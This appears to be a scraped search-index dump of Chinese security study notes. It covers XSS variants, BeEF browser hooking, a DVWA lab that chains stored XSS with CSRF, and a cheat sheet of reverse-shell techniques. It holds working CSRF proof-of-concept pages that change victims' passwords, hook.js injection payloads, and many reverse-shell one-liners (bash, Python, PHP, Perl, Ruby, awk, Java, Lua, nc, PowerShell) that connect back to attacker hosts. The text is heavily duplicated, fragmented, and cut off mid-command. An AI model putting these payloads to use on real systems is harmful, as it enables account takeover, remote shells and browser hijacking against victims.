Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#攻击流程-2"},{"categories":["notes"],"content":"\r0x4 利用流程 1.找注入点 找到数据输入的地方 2.判断回显位置---输入的数据在什么地方输出 如果输入的数据能够在前端进行输出，则可以证明输入的前段恶意代码在没有安全性处理的情 况下能够输出前端，从而造成风险 3.构造基础的payload 4.进行提交payload 5.分析响应状况 1. 如果成功解析则XSS存在 2. 反之考虑绕过 6.确认漏洞 如果响应达到了预期，则说明漏洞存在，反之不存在。 ","date":"2023-11-17","objectID":"/xss/:4:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x4-利用流程"},{"categories":["notes"],"content":"\r0x5 难度高危漏洞但漏洞库不一定接受此漏洞，存储型XSS肯定被接受 1.反射型攻击难度较高 1.如何发送含有payload的连接呢---社工------效率很低 2. 影响面较小 2.存储型XSS攻击难度较小 1.攻击者将恶意代码写入数据库，只要访问该网站的用户必定中招。 ","date":"2023-11-17","objectID":"/xss/:5:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x5-难度"},{"categories":["notes"],"content":"\r0x6 防御 1.过滤---将关键的字符过滤掉 2. 实体化编码 1.将特殊字符转换成字符串 ","date":"2023-11-17","objectID":"/xss/:6:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x6-防御"},{"categories":["notes"],"content":"\r0x7自动化XSS","date":"2023-11-17","objectID":"/xss/:7:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x7自动化xss"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#beef简介"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#信息收集"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#持久化控制"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#社会工程"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#渗透攻击"},{"categories":["notes"],"content":"\rBeEF基础 启动Apache和BeEF: root@kali:~# service apache2 start \u003cscript src=\"http://192.168.106.140:3000/hook.js\"\u003e\u003c/script\u003e 注：192.168.106.140为BeEF所在机器，即Kali Linux IP 登录BeEF: username: beef password: beef 渗透机将脚本放在DWVA靶机中： \u003cscript src=\"http://192.168.106.140:3000/hook.js\"\u003e\u003c/script\u003e 注：192.168.106.140为BeEF所在机器，即Kali Linux IP 注：需修改字符数的限制，例如为200 肉机Win7 访问XSS stored页面 BeEF页面查看肉鸡是否上线 ","date":"2023-11-17","objectID":"/xss/:7:2","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#beef基础"},{"categories":["notes"],"content":"\r信息收集\r命令颜色(Color): 绿色 对目标主机生效并且不可见（不会被发现） 橙色 对目标主机生效但可能可见（可能被发现） 灰色 对目标主机未必生效（可验证下） 红色 对目标主机不生效 这篇博客是从CSDN上扒下来的，借着护网面试的缘由，复习了一下 本文链接：https://blog.csdn.net/weixin_53002381/article/details/126017006 ","date":"2023-11-17","objectID":"/xss/:7:3","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#信息收集-1"},{"categories":["notes"],"content":"XSS+CSRF组合打法 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:0:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#"},{"categories":["notes"],"content":"\rXSS+CSRF组合打法看了一位大佬的复现笔记，自己也做了一下。 靶场平台是DVWA，服务器都是挂在本地。 这种攻击手法需要在Security Level为low的等级下进行 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:0:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#xsscsrf组合打法"},{"categories":["notes"],"content":"\r存储型 XSS + CSRF","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#存储型-xss--csrf"},{"categories":["notes"],"content":"\r1.构造poc\r首先构造CSRF代码使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。 使用CSRFTester抓取流量有几个要点： 浏览器代理端口为8008 CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则127.0.0.1 www.test.com 打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change 之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。 之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。 对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的，最后修改后的 CSRF POC 代码如下。 \u003chtml\u003e \u003cbody onload=\"javascript:fireForms()\"\u003e \u003cscript language=\"JavaScript\"\u003e var pauses = new Array( \"42\" ); function pausecomp(millis){ var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date \u003c millis);} function fireForms(){ var count = 1; var i=0; for(i=0; i\u003ccount; i++){ document.forms[i].submit(); pausecomp(pauses[i]);}} \u003c/script\u003e \u003cform method=\"GET\" name=\"form0\" action=\"http://192.168.38.132:80/dvwa/vulnerabilities/csrf/?password_new=12345678\u0026password_conf=12345678\u0026Change=Change\"\u003e \u003cinput type=\"hidden\" name=\"password_new\" value=\"123123\"/\u003e \u003cinput type=\"hidden\" name=\"password_conf\" value=\"123123\"/\u003e \u003cinput type=\"hidden\" name=\"Change\" value=\"Change\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP 同时，通过CSRFTester导出的原始数据如下，可以对比一下： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eOWASP CRSFTester Demonstration\u003c/title\u003e \u003c/head\u003e \u003cbody onload=\"javascript:fireForms()\"\u003e \u003cscript language=\"JavaScript\"\u003e var pauses = new Array( \"17\",\"23\" ); function pausecomp(millis) { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date \u003c millis); } function fireForms() { var count = 2; var i=0; for(i=0; i\u003ccount; i++) { document.forms[i].submit(); pausecomp(pauses[i]); } } \u003c/script\u003e \u003cH2\u003eOWASP CRSFTester Demonstration\u003c/H2\u003e \u003cform method=\"GET\" name=\"form0\" action=\"http://www.test.com:80/DVWA/vulnerabilities/csrf/?password_current=111\u0026password_new=111\u0026password_conf=111\u0026Change=Change\u0026user_token=c2458bf983aa09631d2abcb07e0f9849\"\u003e \u003cinput type=\"hidden\" name=\"name\" value=\"value\"/\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 随后构造XSS代码 \u003cscript src=\"x\" onerror=javascript:window.open(\"http://192.168.38.1/csrf.html\")\u003e\u003c/script\u003e 根据需要进行修改 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#1构造poc"},{"categories":["notes"],"content":"\r1.构造poc\r首先构造CSRF代码使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。 使用CSRFTester抓取流量有几个要点： 浏览器代理端口为8008 CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则127.0.0.1 www.test.com 打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change 之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。 之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。 对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的，最后修改后的 CSRF POC 代码如下。 可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP 同时，通过CSRFTester导出的原始数据如下，可以对比一下： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e OWASP CRSFTester Demonstration OWASP CRSFTester Demonstration 随后构造XSS代码 根据需要进行修改 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#首先构造csrf代码"},{"categories":["notes"],"content":"\r1.构造poc\r首先构造CSRF代码使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。 使用CSRFTester抓取流量有几个要点： 浏览器代理端口为8008 CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则127.0.0.1 www.test.com 打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change 之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。 之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。 对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的，最后修改后的 CSRF POC 代码如下。 可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP 同时，通过CSRFTester导出的原始数据如下，可以对比一下： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e OWASP CRSFTester Demonstration OWASP CRSFTester Demonstration 随后构造XSS代码 根据需要进行修改 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#随后构造xss代码"},{"categories":["notes"],"content":"\r2.进行xss攻击在 XSS (Stored) 模块下，插入 XSS 代码 在 DVWA 中会碰到 POC 太长而无法输入完全的情况，这个时候在开发者工具中将这个框的 maxlength 值设置大一点即可，这里我设置了 500. 点击 sign guestbook 按钮，POC 就会被插进去了，之后用其他浏览器登陆其他用户，访问存储型 XSS 模块页面，就会触发xss 访问页面后，浏览器会自动跳转，同时返回修改密码的界面，如果弹出页面显示如上图中的 Password Changed 字样，就说明受害者的密码修改成功了，而这也仅仅是因为受害者点击了一个页面。 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:2","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#2进行xss攻击"},{"categories":["notes"],"content":"\rCSRF + SelfXSS​ 在这套组合打法中，用到了BeFF工具： ​ BeFF:The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。 ​ BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#csrf--selfxss"},{"categories":["notes"],"content":"\r安装：一般是安装在linux系统里的 sudo apt-get install beef-xss 随后可运行 sudo beef-xss 随后可以看到我们的钩子js代码 ip需要自行修改为主机ip，钓鱼页面(被攻击页面)是因为插入了一下js脚本： Js脚本： \u003cscript src=\"http://192.168.3.59:3000/hook.js\"\u003e\u003c/script\u003e 目标打开带有js脚本的文件后 然后beef中会看到被害者上线，可以进行控制，可以记录键盘输入 相关的配置文件在目录：/usr/share/beef-xss/下的config.yaml中 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#安装"},{"categories":["notes"],"content":"\r实操：浏览器输入http://192.168.3.59:3000/demos/butcher/index.html打开默认测试页面 随后进入http://192.168.3.59:3000/ui/panel页面，就会看到自己被上线 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:2","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#实操"},{"categories":["notes"],"content":"\r模块命令的使用和模块的作用种类：**Broser：**主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。 **Chrome extensions：**主要是针对谷歌浏览器扩展插件 **Debug：**调试功能 **Exploits：**漏洞利用，主要利用一些已公开的漏洞进行攻击测试 **Host：**针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等 **IPEC：**协议间通信。主要是用来连接、控制受害者浏览器的 **Metasploit：**Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试 **Misc：**杂项。 **Network：**网络扫描 **Persistence：**维护受害者访问 **Phonegap：**手机测试 **Social engineering：**社会工程学攻击 其中： 绿色模块：可以执行且目标不可见 红色模块：不适合当前目标 橙色模块：可以执行但目标可见 灰色模块：未在目标浏览器上测试过 **比如，**可以使目标主机浏览器发出某种音频 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:3","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#模块命令的使用和模块的作用种类"},{"categories":["notes"],"content":"\r1.构造 POC\r首先构造XSS代码 \u003cscript src=\"http://192.168.38.129:3000/hook.js\"\u003e\u003c/script\u003e 构造 CSRF 代码CSRFTester 工具生成 CSRF POC。 修改之后的poc \u003chtml\u003e \u003cbody onload=\"javascript:fireForms()\"\u003e \u003cscript language=\"JavaScript\"\u003e var pauses = new Array( \"54\" ); function pausecomp(millis){ var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date \u003c millis);} function fireForms(){ var count = 1; var i=0; for(i=0; i\u003ccount; i++){ document.forms[i].submit(); pausecomp(pauses[i]);}} \u003c/script\u003e \u003cform method=\"GET\" name=\"form0\" action=\"http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=\u003cscript src='http://192.168.38.129:3000/hook.js'\u003e\u003c/script\u003e\"\u003e \u003cinput type=\"hidden\" name=\"name\" value=\"\u003cscript src='http://192.168.38.129:3000/hook.js'\u003e\u003c/script\u003e\"/\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。 http://192.168.38.1/csrf.html ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:4","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#1构造-poc"},{"categories":["notes"],"content":"\r1.构造 POC\r首先构造XSS代码 构造 CSRF 代码CSRFTester 工具生成 CSRF POC。 修改之后的poc 将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。 http://192.168.38.1/csrf.html ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:4","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#首先构造xss代码"},{"categories":["notes"],"content":"\r1.构造 POC\r首先构造XSS代码 构造 CSRF 代码CSRFTester 工具生成 CSRF POC。 修改之后的poc 将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。 http://192.168.38.1/csrf.html ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:4","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#构造-csrf-代码"},{"categories":["notes"],"content":"\r2.beef上线打开链接后，beef 中就能看到上线的主机了。 这个组合打法是需要诱导受害者点击构造的 CSRF 链接的，利用难度要高于第一个组合 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:5","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#2beef上线"},{"categories":["web"],"content":"总(ban)结(yun)来的弹shell多种手法 ","date":"2023-11-17","objectID":"/nc-shell/:0:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#"},{"categories":["web"],"content":"\r1.nc参数 (1) -l 用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。 (2) -p \u003cport\u003e 指定端口，暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数） (3) -s 指定发送数据的源IP地址，适用于多网卡机 (4) -u 指定nc使用UDP协议，默认为TCP (5) -v 输出交互或出错信息，新手调试时尤为有用 (6)-w 超时秒数，后面跟数字 (7)-z 表示zero，表示扫描时不发送任何数据 (8)-n 直接使用IP地址，而不通过域名服务器； (9)-e 执行某个程序 目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下： wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake \u0026\u0026 make installmake clean ","date":"2023-11-17","objectID":"/nc-shell/:1:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#1nc参数"},{"categories":["web"],"content":"\r2.nc建立连接","date":"2023-11-17","objectID":"/nc-shell/:2:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#2nc建立连接"},{"categories":["web"],"content":"\r消息共享服务端启动监听 nc -lnvp 4444 客户端进行连接 nc -nv IP 4444 客户端与服务端实现消息共享，即客户端的输入服务端可见，服务端的输入客户端可见。 ","date":"2023-11-17","objectID":"/nc-shell/:2:1","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#消息共享"},{"categories":["web"],"content":"\r文件传输和局域网聊天是原理一样的，不过把输入输出重定向到文件 服务端设置监听 exe -lnvp 4444 \u003erecv.txt 客户端发送： nc IP 4444 \u003c1.txt 注：服务端和客户端都可做为接收端和发送端，发送端必须要有文件，接收端可以不创建文件，当接受端不创建文件时，会自动创建并将发送端地内容保存到文件，如果已存在文件将会覆盖其中内容 ","date":"2023-11-17","objectID":"/nc-shell/:2:2","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#文件传输"},{"categories":["web"],"content":"\r3.正向弹shell在服务端（靶标机）启动监听 nc -lvvp 4444 -e /bin/bash 在客户端（攻击机）连接 nc IP 4444 这种连接又称正向连接，攻击机主动连接靶标机。 连接成功后便可执行命令。 ","date":"2023-11-17","objectID":"/nc-shell/:3:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#3正向弹shell"},{"categories":["web"],"content":"\r4.反向弹shell","date":"2023-11-17","objectID":"/nc-shell/:4:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#4反向弹shell"},{"categories":["web"],"content":"\rbash版本本地作为服务端开启监听（攻击机） nc -lvnp 4444 或nc -vvlp 4444 目标机开启反弹 bash -i \u003e\u0026 /dev/tcp/IP/4444 0\u003e\u00261 bash -i 创建一个交互式的bash shell \u0026\u003e 将标准输出和标准错误都重定向到我们指定的文件 /dev/tcp/IP/4444 建立连接到IP的4444端口 0\u003e\u00261 将文件描述符0重定向为文件描述符1，也就是标准输入被重定向为标准输出 ","date":"2023-11-17","objectID":"/nc-shell/:4:1","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#bash版本"},{"categories":["web"],"content":"\rpython 反弹本地作为服务器开启监听 nc -lvvp 444 靶机作为客户端开启反弹 python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 连的时候会稍微有点慢 ","date":"2023-11-17","objectID":"/nc-shell/:4:2","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#python-反弹"},{"categories":["web"],"content":"\rnc反弹本地作为服务器开启监听 nc -lvvp 4444 靶标机作为客户端反弹shell nc -e /bin/bash IP 4444 ","date":"2023-11-17","objectID":"/nc-shell/:4:3","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nc反弹"},{"categories":["web"],"content":"\rawk反弹 awk 'BEGIN{s=\"/inet/tcp/0/VPS_IP/1234\";for(;s|\u0026getline c;close(c))while(c|getline)print|\u0026s;close(s)}' ","date":"2023-11-17","objectID":"/nc-shell/:4:4","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#awk反弹"},{"categories":["web"],"content":"\rphp反弹本地作为服务器开启监听 nc -lvnp 4444 靶标机作为客户端反弹shell php- 'exec(\"/bin/bash -i \u003e\u0026 /dev/tcp/ip/4444\")' 或 php -r '$sock=fsockopen(\"IP\",4444);exec(\"/bin/bash -i 0\u003e\u00263 1\u003e\u00263 2\u003e\u00263\");' ","date":"2023-11-17","objectID":"/nc-shell/:4:5","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#php反弹"},{"categories":["web"],"content":"\rperl反弹本地作为服务器开启监听 nc -lvvp 4444 靶标机作为客户端反弹shell perl -e 'use Socket;$i=\"IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' ","date":"2023-11-17","objectID":"/nc-shell/:4:6","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#perl反弹"},{"categories":["web"],"content":"\rruby反弹本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell ruby -rsocket -e'f=TCPSocket.open(\"IP\",4444).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' ","date":"2023-11-17","objectID":"/nc-shell/:4:7","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#ruby反弹"},{"categories":["web"],"content":"\rJava反弹本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell r = Runtime.getRuntime() p = r.``exec``([``\"/bin/bash\"``,``\"-c\"``,``\"exec 5\u003c\u003e/dev/tcp/IP/4444;cat \u003c\u00265 | while read line; do \\$line 2\u003e\u00265 \u003e\u00265; done\"``] as String[]) p.waitFor() ","date":"2023-11-17","objectID":"/nc-shell/:4:8","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#java反弹"},{"categories":["web"],"content":"\rlua版本本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘IP’,‘4444’);os.execute(’/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263’);” ","date":"2023-11-17","objectID":"/nc-shell/:4:9","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#lua版本"},{"categories":["web"],"content":"\rnc不使用-e参数反弹本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell mknod` `/tmp/backpipe` `p /bin/sh` `0\u003c``/tmp/backpipe` `| nc IP 4444 1\u003e``/tmp/backpipe /bin/bash` `-i \u003e ``/dev/tcp/IP````/4444 ``0\u003c\u00261 2\u003e\u00261 ```mknod backpipe p \u0026\u0026 telnet IP 4444 0backpipe` ","date":"2023-11-17","objectID":"/nc-shell/:4:10","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nc不使用-e参数反弹"},{"categories":["web"],"content":"\r5.Windows下反弹shell","date":"2023-11-17","objectID":"/nc-shell/:5:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#5windows下反弹shell"},{"categories":["web"],"content":"\rnc反弹shell netcat 下载：https://eternallybored.org/misc/netcat/ 服务端反弹：nc VPS_IP 1234 -e c:\\windows\\system32\\cmd.exe ","date":"2023-11-17","objectID":"/nc-shell/:5:1","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nc反弹shell"},{"categories":["web"],"content":"\rpowershell反弹powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。 PS C:\\WWW\u003epowershell IEX (New-Object 